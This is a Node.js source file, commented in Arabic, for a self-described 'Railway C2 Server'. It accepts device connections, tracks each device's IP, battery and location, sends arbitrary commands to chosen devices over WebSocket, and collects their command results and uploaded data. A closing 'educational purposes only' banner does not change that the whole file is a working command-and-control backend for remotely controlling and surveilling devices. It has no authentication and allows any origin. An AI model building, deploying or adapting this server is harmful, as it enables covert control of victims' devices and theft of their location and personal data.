const express = require('express');
const { Server } = require('socket.io');
const http = require('http');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

// إعداد Socket.io لـ Railway
const io = new Server(server, {
  cors: {
    origin: process.env.ALLOWED_ORIGINS || "*",
    methods: ["GET", "POST"],
    credentials: true
  },
  transports: ['websocket', 'polling'],
  pingTimeout: 60000,
  pingInterval: 25000
});

app.use(cors({
  origin: process.env.ALLOWED_ORIGINS || "*",
  credentials: true
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== تخزين البيانات ==========
const connectedDevices = new Map();
const commandHistory = [];

// ========== Health Check ==========
app.get('/health', (req, res) => {
  res.json({
    status: 'online',
    server: 'Railway C2 Server',
    version: '2.0.0',
    environment: process.env.NODE_ENV || 'development',
    connectedDevices: connectedDevices.size,
    commandsProcessed: commandHistory.length,
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    timestamp: Date.now()
  });
});

// ========== API Routes ==========

// 1. قائمة الأجهزة
app.get('/api/devices', (req, res) => {
  const devices = Array.from(connectedDevices.values()).map(device => ({
    id: device.id,
    name: device.name || 'Unknown Device',
    type: device.type || 'unknown',
    os: device.os || 'unknown',
    ip: device.ip || 'unknown',
    status: device.status || 'online',
    connectedAt: device.connectedAt,
    lastSeen: device.lastSeen,
    battery: device.battery,
    location: device.location
  }));
  
  res.json({
    success: true,
    count: devices.length,
    devices: devices
  });
});

// 2. إرسال أمر لجهاز
app.post('/api/command', (req, res) => {
  const { deviceId, command, data = {} } = req.body;
  
  const device = connectedDevices.get(deviceId);
  if (!device) {
    return res.status(404).json({
      success: false,
      message: 'Device not found or offline'
    });
  }
  
  if (!device.socketId) {
    return res.status(400).json({
      success: false,
      message: 'Device not connected via WebSocket'
    });
  }
  
  const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
  const fullCommand = {
    commandId: commandId,
    type: 'command',
    action: command,
    data: data,
    timestamp: Date.now(),
    server: 'railway.app'
  };
  
  // حفظ في السجل
  commandHistory.push({
    ...fullCommand,
    deviceId: deviceId,
    status: 'sent'
  });
  
  // إرسال عبر Socket.io
  io.to(device.socketId).emit('command', fullCommand);
  
  res.json({
    success: true,
    message: 'Command sent successfully',
    commandId: commandId,
    deviceId: deviceId,
    command: command,
    timestamp: new Date().toISOString()
  });
});

// 3. الحصول على سجلات الأوامر
app.get('/api/commands', (req, res) => {
  const limit = parseInt(req.query.limit) || 50;
  const deviceId = req.query.deviceId;
  
  let commands = commandHistory;
  
  if (deviceId) {
    commands = commands.filter(cmd => cmd.deviceId === deviceId);
  }
  
  commands = commands.slice(-limit).reverse();
  
  res.json({
    success: true,
    count: commands.length,
    commands: commands
  });
});

// 4. معلومات السيرفر
app.get('/api/server/info', (req, res) => {
  res.json({
    success: true,
    server: {
      name: 'Railway C2 Server',
      url: process.env.RAILWAY_STATIC_URL || 'https://railway.app',
      environment: process.env.NODE_ENV,
      region: process.env.RAILWAY_REGION || 'unknown',
      serviceId: process.env.RAILWAY_SERVICE_ID || 'unknown',
      version: '2.0.0'
    },
    stats: {
      connectedDevices: connectedDevices.size,
      commandsProcessed: commandHistory.length,
      uptime: process.uptime()
    }
  });
});

// ========== WebSocket Events ==========
io.on('connection', (socket) => {
  console.log(`🔗 New WebSocket connection: ${socket.id} from ${socket.handshake.address}`);
  
  // إنشاء ID فريد للجهاز
  const deviceId = `device_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  
  // بيانات الجهاز الأساسية
  const deviceInfo = {
    id: deviceId,
    socketId: socket.id,
    ip: socket.handshake.address,
    connectedAt: new Date().toISOString(),
    lastSeen: new Date().toISOString(),
    status: 'online'
  };
  
  connectedDevices.set(deviceId, deviceInfo);
  
  // إرسال رسالة ترحيبية
  socket.emit('welcome', {
    type: 'welcome',
    message: 'Connected to Railway C2 Server',
    deviceId: deviceId,
    serverTime: Date.now(),
    serverInfo: {
      name: 'Railway C2',
      url: process.env.RAILWAY_STATIC_URL || 'https://railway.app',
      version: '2.0.0'
    }
  });
  
  // ========== Event Handlers ==========
  
  // 1. تسجيل الجهاز
  socket.on('register', (data) => {
    const device = connectedDevices.get(deviceId);
    if (device) {
      device.name = data.deviceName || 'Unknown Device';
      device.type = data.deviceType || 'android';
      device.os = data.os || 'Unknown OS';
      device.info = data.info || {};
      device.lastSeen = new Date().toISOString();
      
      console.log(`✅ Device registered: ${device.name} (${deviceId})`);
      
      socket.emit('registered', {
        success: true,
        deviceId: deviceId,
        message: 'Device registered successfully'
      });
      
      // إعلام جميع المستخدمين
      io.emit('device_connected', {
        deviceId: deviceId,
        name: device.name,
        type: device.type,
        timestamp: new Date().toISOString()
      });
    }
  });
  
  // 2. تحديث حالة الجهاز
  socket.on('heartbeat', (data) => {
    const device = connectedDevices.get(deviceId);
    if (device) {
      device.lastSeen = new Date().toISOString();
      device.status = 'online';
      device.battery = data.battery;
      device.location = data.location;
      device.info = { ...device.info, ...data.info };
      
      // رد على الـ heartbeat
      socket.emit('heartbeat_ack', {
        timestamp: Date.now()
      });
    }
  });
  
  // 3. استقبال نتائج الأوامر
  socket.on('command_result', (result) => {
    console.log(`📝 Command result from ${deviceId}: ${result.commandId}`);
    
    // تحديث سجل الأمر
    const commandIndex = commandHistory.findIndex(cmd => cmd.commandId === result.commandId);
    if (commandIndex !== -1) {
      commandHistory[commandIndex].status = result.status;
      commandHistory[commandIndex].result = result.result;
      commandHistory[commandIndex].completedAt = new Date().toISOString();
    }
    
    // إرسال النتيجة للجميع
    io.emit('command_completed', {
      deviceId: deviceId,
      commandId: result.commandId,
      status: result.status,
      result: result.result,
      timestamp: new Date().toISOString()
    });
  });
  
  // 4. استقبال البيانات من الجهاز
  socket.on('data', (data) => {
    console.log(`📊 Data from ${deviceId}: ${data.type}`);
    
    // يمكنك حفظ البيانات في قاعدة بيانات هنا
    io.emit('new_data', {
      deviceId: deviceId,
      type: data.type,
      data: data.data,
      timestamp: new Date().toISOString()
    });
  });
  
  // 5. عند انفصال الجهاز
  socket.on('disconnect', (reason) => {
    console.log(`❌ Device disconnected: ${deviceId} - Reason: ${reason}`);
    
    const device = connectedDevices.get(deviceId);
    if (device) {
      device.status = 'offline';
      device.lastSeen = new Date().toISOString();
      device.disconnectedAt = new Date().toISOString();
      device.disconnectReason = reason;
      
      // إعلام جميع المستخدمين
      io.emit('device_disconnected', {
        deviceId: deviceId,
        name: device.name,
        reason: reason,
        timestamp: new Date().toISOString()
      });
    }
  });
  
  // 6. خطأ في الاتصال
  socket.on('error', (error) => {
    console.error(`💥 Socket error for ${deviceId}:`, error);
  });
});

// ========== Ping/Pong للحفاظ على الاتصال ==========
setInterval(() => {
  connectedDevices.forEach((device, deviceId) => {
    if (device.socketId) {
      const socket = io.sockets.sockets.get(device.socketId);
      if (socket) {
        socket.emit('ping', { timestamp: Date.now() });
      }
    }
    
    // إذا مر أكثر من 2 دقيقة دون تحديث
    const lastSeen = new Date(device.lastSeen);
    const now = new Date();
    const diffMinutes = (now - lastSeen) / (1000 * 60);
    
    if (diffMinutes > 2 && device.status === 'online') {
      device.status = 'offline';
      console.log(`⏰ Device marked as offline: ${deviceId}`);
    }
  });
}, 30000); // كل 30 ثانية

// ========== منع النوم ==========
// Railway قد ينام التطبيق بعد عدم استخدام
setInterval(() => {
  console.log('🔄 Keeping Railway app alive...');
}, 5 * 60 * 1000); // كل 5 دقائق

// ========== Start Server ==========
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`
  ============================================
  🚀 RAILWAY C2 SERVER - AHMED SYSTEM
  ============================================
  ✅ Port: ${PORT}
  ✅ Environment: ${process.env.NODE_ENV || 'development'}
  ✅ URL: http://0.0.0.0:${PORT}
  ✅ WebSocket: ws://0.0.0.0:${PORT}
  ============================================
  📊 API Endpoints:
  • GET  /health           - Health check
  • GET  /api/devices      - List devices
  • POST /api/command      - Send command
  • GET  /api/commands     - Command history
  • GET  /api/server/info  - Server info
  ============================================
  ⚠️  FOR EDUCATIONAL PURPOSES ONLY
  ============================================
  `);
});